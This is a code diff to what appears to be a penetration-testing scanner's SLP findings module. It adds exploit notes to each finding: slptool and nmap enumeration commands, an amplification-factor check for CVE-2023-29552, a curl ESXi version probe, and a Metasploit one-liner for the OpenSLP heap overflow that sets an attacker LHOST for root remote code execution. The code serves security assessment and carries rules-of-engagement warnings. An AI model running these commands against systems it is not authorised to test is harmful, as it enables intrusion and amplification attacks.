@@ -495,10 +495,11 @@ def slp_targets(hosts: list[Host]) -> list[dict]:
 
 
 def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
-             cves=None):
+             cves=None, exploit_note="", depth_tier=""):
     f = {"severity": sev, "title": title, "target": target, "detail": detail,
          "tool": "slptool", "command": cmd, "remediation": rem,
-         "cwes": cwes, "kind": kind}
+         "cwes": cwes, "kind": kind,
+         "exploit_note": exploit_note, "depth_tier": depth_tier}
     if cves:
         f["cves"] = cves
     return f
@@ -544,7 +545,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Restrict SLP to the management network or disable it. "
                     "SLPv2 authentication blocks (RFC 2608 §9) are rarely "
                     "implemented — the practical control is network isolation.",
-                    ["CWE-200", "CWE-306"], kind="slp_service_catalogue"))
+                    ["CWE-200", "CWE-306"], kind="slp_service_catalogue",
+                    exploit_note=(
+                        "slptool -u <ip> findsrvtypes; for each type: slptool "
+                        "-u <ip> findsrvs <type>; feed URLs into nmap -sV -Pn "
+                        "<extracted_urls>."
+                    ),
+                    depth_tier="t1"))
 
             urls = pr.get("urls") or []
             if urls:
@@ -600,7 +607,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Firewall 427/udp inbound from the internet. Consider "
                     "rate-limiting 427/udp egress at the perimeter.",
                     ["CWE-406"], kind="slp_amplifier",
-                    cves=["CVE-2023-29552"]))
+                    cves=["CVE-2023-29552"],
+                    exploit_note=(
+                        "nmap -sU -p427 --script slp-info <ip> | grep -A2 "
+                        "'response'; measured BAF = response_bytes / 82. Do "
+                        "NOT test spoofed egress off-lab."
+                    ),
+                    depth_tier="t1"))
 
             # DA discovery — a directory-agent URL in the enumerated list.
             da_urls = [u["url"] for u in urls
@@ -644,7 +657,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "shipped SLP disabled by default from 7.0 U2c onward.",
                     ["CWE-787", "CWE-416", "CWE-306"],
                     kind="slp_esxi_openslp_rce",
-                    cves=["CVE-2021-21974", "CVE-2019-5544", "CVE-2020-3992"]))
+                    cves=["CVE-2021-21974", "CVE-2019-5544", "CVE-2020-3992"],
+                    exploit_note=(
+                        "msfconsole -q -x 'use exploit/multi/vmware/"
+                        "openslp_heap_overflow; set RHOSTS <ip>; set LHOST "
+                        "<attacker>; run'  # root RCE; do NOT run without ROE. "
+                        "Also: python PoC gists exist for CVE-2019-5544."
+                    ),
+                    depth_tier="t1"))
             elif esxi is not None and not esxi.get("vulnerable"):
                 out.append(_finding(
                     "info",
@@ -674,7 +694,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "service:VMwareInfrastructure",
                     "Patch ESXi to the VMSA-2021-0002 fix line; disable SLP "
                     "on ESXi (esxcli system slp set --enable false).",
-                    ["CWE-787", "CWE-416"], kind="slp_esxi_unknown_build"))
+                    ["CWE-787", "CWE-416"], kind="slp_esxi_unknown_build",
+                    exploit_note=(
+                        "curl -sk https://<ip>/ui/ | grep -oE 'ESXi [0-9.]+'  "
+                        "# front-end sometimes carries the version; then "
+                        "compare against VMSA-2021-0002."
+                    ),
+                    depth_tier="t0"))
 
             if pr.get("scopes"):
                 out.append(_finding(
